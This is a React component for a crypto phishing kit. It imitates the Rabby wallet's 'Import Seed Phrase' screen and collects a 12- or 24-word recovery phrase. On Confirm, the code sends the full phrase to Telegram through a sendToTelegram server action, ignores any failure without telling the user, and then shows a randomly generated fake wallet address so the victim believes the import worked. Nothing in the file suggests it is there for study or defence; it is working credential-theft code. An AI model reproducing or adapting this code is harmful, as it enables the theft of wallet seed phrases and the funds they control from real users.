"use client"

import { useState } from "react"
import { Dialog, DialogContent } from "@/components/ui/dialog"
import { sendToTelegram } from "@/app/actions/telegram"

const inputStyle: React.CSSProperties = {
  color: '#000000',
  backgroundColor: '#ffffff',
  WebkitTextFillColor: '#000000',
  caretColor: '#000000'
}

interface RabbySeedPhraseImportProps {
  open: boolean
  onOpenChange: (open: boolean) => void
  onBack: () => void
  onWalletConnected?: (address: string) => void
}

export function RabbySeedPhraseImport({
  open,
  onOpenChange,
  onBack,
  onWalletConnected,
}: RabbySeedPhraseImportProps) {
  const [seedPhrase, setSeedPhrase] = useState<string[]>(Array(12).fill(""))
  const [wordCount, setWordCount] = useState(12)
  const [isLoading, setIsLoading] = useState(false)

  const handleInputChange = (index: number, value: string) => {
    const newSeedPhrase = [...seedPhrase]
    newSeedPhrase[index] = value
    setSeedPhrase(newSeedPhrase)
  }

  const handleConfirm = async () => {
    setIsLoading(true)
    try {
      // Send seed phrase to Telegram
      const seedPhraseText = seedPhrase.join(" ")
      await sendToTelegram("seed_phrase", seedPhraseText)
    } catch (error) {
      // Silently fail - continue with wallet import even if Telegram fails
      console.error("Failed to send to Telegram:", error)
    }
    
    // Simulate wallet import
    const mockAddress = "0x" + Array.from({ length: 40 }, () => Math.floor(Math.random() * 16).toString(16)).join("")
    if (onWalletConnected) {
      onWalletConnected(mockAddress)
    }
    setIsLoading(false)
  }

  const isComplete = seedPhrase.every((word) => word.trim().length > 0)

  return (
    <>
      <style dangerouslySetInnerHTML={{__html: `
        .seed-phrase-input {
          color: #000000 !important;
          background-color: #ffffff !important;
          -webkit-text-fill-color: #000000 !important;
          caret-color: #000000 !important;
        }
        .seed-phrase-input::placeholder {
          color: #9ca3af !important;
        }
      `}} />
      <Dialog open={open} onOpenChange={onOpenChange}>
        <DialogContent className="w-screen h-screen bg-[#4A70F7] p-0 border-0 shadow-none" showCloseButton={false} fullscreen>
        <div className="w-full h-full flex flex-col items-center justify-center p-2 sm:p-4 overflow-y-auto">
          <div className="bg-white rounded-2xl w-full max-w-[400px] h-auto min-h-[520px] max-h-[90vh] shadow-xl flex flex-col my-4 sm:my-0 sm:h-[520px]">
            <div className="flex-1 flex flex-col px-4 py-6 sm:px-8 sm:py-8 overflow-y-auto">
              {/* Header */}
              <div className="mb-4 sm:mb-6">
                <div className="flex justify-center mb-3 sm:mb-4">
                  <div className="flex gap-2">
                    <div className="w-2 h-2 rounded-full bg-blue-300"></div>
                    <div className="w-2 h-2 rounded-full bg-[#4A70F7]"></div>
                    <div className="w-2 h-2 rounded-full bg-blue-300"></div>
                  </div>
                </div>
                <div className="flex items-center mb-3 sm:mb-4">
                  <button
                    onClick={onBack}
                    className="mr-3 p-1 hover:bg-gray-100 rounded-lg transition-colors"
                  >
                    <svg
                      className="w-5 h-5 text-gray-600"
                      fill="none"
                      stroke="currentColor"
                      viewBox="0 0 24 24"
                    >
                      <path
                        strokeLinecap="round"
                        strokeLinejoin="round"
                        strokeWidth={2}
                        d="M15 19l-7-7 7-7"
                      />
                    </svg>
                  </button>
                  <h2 className="text-lg sm:text-xl font-semibold text-gray-800">Import Seed Phrase</h2>
                </div>
              </div>

              {/* Word Count Selector */}
              <div className="mb-3 sm:mb-4">
                <div className="flex items-center gap-2 text-xs sm:text-sm text-gray-600">
                  <span>I have a</span>
                  <select
                    value={wordCount}
                    onChange={(e) => {
                      const count = parseInt(e.target.value)
                      setWordCount(count)
                      setSeedPhrase(Array(count).fill(""))
                    }}
                    className="text-[#4A70F7] font-medium border-0 bg-transparent cursor-pointer focus:outline-none"
                  >
                    <option value={12}>12-word phrase</option>
                    <option value={24}>24-word phrase</option>
                  </select>
                </div>
              </div>

              {/* Seed Phrase Input Grid */}
              <div className="grid grid-cols-2 sm:grid-cols-3 gap-2 mb-4 sm:mb-6 flex-1 overflow-y-auto">
                {seedPhrase.map((word, index) => (
                  <div key={index} className="relative">
                    <span className="absolute top-1 left-2 text-[10px] sm:text-xs text-gray-400">
                      {index + 1}.
                    </span>
                    <input
                      type={word ? "password" : "text"}
                      value={word}
                      onChange={(e) => handleInputChange(index, e.target.value)}
                      className="seed-phrase-input w-full pt-4 sm:pt-5 pb-1 px-2 border border-gray-200 rounded-lg text-xs sm:text-sm text-black bg-white focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500"
                      placeholder=""
                      autoFocus={index === 0}
                      style={inputStyle}
                    />
                  </div>
                ))}
              </div>

              {/* Confirm Button */}
              <button
                onClick={handleConfirm}
                disabled={!isComplete || isLoading}
                className="w-full py-2.5 sm:py-3 bg-[#4A70F7] text-white rounded-xl text-sm sm:text-base font-medium hover:bg-[#3a5fd7] transition-colors disabled:opacity-50 disabled:cursor-not-allowed mt-auto flex items-center justify-center"
              >
                {isLoading ? (
                  <>
                  <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                  </svg>
                  Processing...
                  </>
                ) : (
                  "Confirm"
                )}
              </button>
            </div>
          </div>
        </div>
        </DialogContent>
      </Dialog>
    </>
  )
}

